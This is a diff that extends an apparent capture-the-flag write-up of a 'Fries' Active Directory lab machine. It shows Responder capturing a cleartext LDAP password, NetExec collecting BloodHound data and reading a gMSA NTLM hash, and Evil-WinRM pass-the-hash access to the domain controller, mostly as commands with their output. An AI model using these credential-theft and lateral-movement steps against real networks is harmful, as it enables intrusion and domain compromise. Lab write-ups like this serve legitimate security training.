@@ -496,4 +496,87 @@ Hardware.Mon.#1..: Temp: 49c Util: 97% Core:2520MHz Mem:8001MHz Bus:8
 ### Port 443
 
 ![Image description](assets/images/fries/friesport443.png)
+![](assets/images/fries/2026-02-12_10-52.png)
+enter the password
+![](assets/images/fries/2026-02-12_11-00.png)
+
+![](assets/images/fries/2026-02-12_11-01.png)
+Test LDAP Profile
+i used responder to listen
+```sh
+➜  ~ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+
+[*] Tips jar:
+    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+
+[LDAP] Cleartext Client   : 10.129.244.72
+[LDAP] Cleartext Username : CN=svc_infra,CN=Users,DC=fries,DC=htb
+[LDAP] Cleartext Password : m6tneOMAh5p0wQ0d
+[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
+[*] Skipping previously captured cleartext password for CN=svc_infra,CN=Users,DC=fries,DC=htb
+```
+now we have the password of svc_infra
+```
+svc_infra:m6tneOMAh5p0wQ0d
+```
+check is vaild in bloodhound
+
+```sh
+➜  fires nxc smb 10.129.16.25 -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d'          
+SMB         10.129.16.25    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.16.25    445    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
+```
+there's no intersting shares this user don't have winrm access
+#### bloodHound
+```sh
+➜  bloodHound nxc ldap 10.129.16.25 -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d'  --bloodhound --dns-server 10.129.16.25 -c all     
+LDAP        10.129.16.25    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.16.25    389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
+LDAP        10.129.16.25    389    DC01             Resolved collection methods: psremote, group, acl, dcom, session, container, trusts, localadmin, rdp, objectprops
+[07:25:46] ERROR    Unhandled exception in computer DC01.fries.htb processing: [Errno 32] Broken pipe                                                                                                                         computers.py:268
+LDAP        10.129.16.25    389    DC01             Done in 0M 47S
+LDAP        10.129.16.25    389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.16.25_2026-02-02_072455_bloodhound.zip
+```
+
+we can Read GMSAPassword
+![](assets/images/fries/2026-02-12_11-12.png)
+
+```sh
+➜  bloodhound nxc ldap fries.htb -u 'svc_infra' -p 'm6tneOMAh5p0wQ0d'  --gmsa   
+LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.244.72   389    DC01             [+] fries.htb\svc_infra:m6tneOMAh5p0wQ0d 
+LDAP        10.129.244.72   389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.244.72   389    DC01             Account: gMSA_CA_prod$        NTLM: cb91dc519860daf4ccd15e89e5a9d5ad     PrincipalsAllowedToReadPassword: svc_infra
+```
+we can evil-winrm
+```sh
+➜  bloodhound nxc winrm fries.htb -u 'gMSA_CA_prod$' -H 'cb91dc519860daf4ccd15e89e5a9d5ad'
+WINRM       10.129.244.72   5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) 
+WINRM       10.129.244.72   5985   DC01             [+] fries.htb\gMSA_CA_prod$:cb91dc519860daf4ccd15e89e5a9d5ad (Pwn3d!)
+```
+
+GMSA_CA_PROD$  -->ManageCA -->FRIES-DC01-CA
+![](assets/images/fries/2026-02-12_11-18.png)
+
+The gMSA account has **CA Administrator (Manage CA)** rights over the Enterprise CA.
+
+```sh
+➜  bloodhound evil-winrm -i fries.htb -u 'gMSA_CA_prod$' -H 'cb91dc519860daf4ccd15e89e5a9d5ad'  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\gMSA_CA_prod$\Documents> 
+```
 
